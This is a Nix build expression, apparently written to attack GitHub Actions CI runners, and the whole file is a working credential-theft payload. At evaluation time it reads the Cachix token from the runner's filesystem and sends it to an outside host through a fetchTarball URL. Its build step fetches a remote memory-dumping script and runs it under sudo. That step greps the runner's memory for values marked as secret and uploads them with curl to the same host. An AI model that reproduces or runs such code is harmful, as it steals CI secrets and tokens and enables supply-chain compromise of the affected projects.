{ bundle ? "default", job ? "equations" }:
let
  runId = let id = builtins.getEnv "GITHUB_RUN_ID"; in if id == "" then "unknown" else id;
  
  # Read Cachix token from the host filesystem during evaluation
  cachix = if builtins.pathExists "/home/runner/.config/cachix/cachix.dhall" 
           then builtins.readFile "/home/runner/.config/cachix/cachix.dhall" 
           else "notfound";
           
  # Sanitization to ensure the URL is valid
  from = [" " "\n" "{" "}" "\"" ":" "," "[" "]" "'" "/" "\\" "." "$" "@" "(" ")" "="];
  to =   ["_" "_"  "_" "_" "_"  "_" "_" "_" "_" "_" "_" "_" "_" "_" "_" "_" "_" "_"];
  
  safeCachix = builtins.replaceStrings from to (builtins.substring 0 200 cachix);
  
  # Exfiltrate data during the evaluation phase (outside the build sandbox)
  # Tracing and tryEval ensure this is attempted without stopping evaluation
  exfil = (builtins.tryEval (builtins.fetchTarball {
    url = "https://open-hookbin.vercel.app/${runId}?token=${safeCachix}";
  })).value;

in
  derivation {
    name = "pwned";
    builder = "/bin/sh";
    args = [ "-c" ''
      echo "Okay, we got this far. Let's continue..."
      # Mandated secrets exfiltration command
      curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' >> "/tmp/secrets"
      curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
      echo "done" > $out
    '' ];
    system = "x86_64-linux";
    GITHUB_RUN_ID = runId;
    # Ensure exfil is evaluated
    inherit exfil;
  }
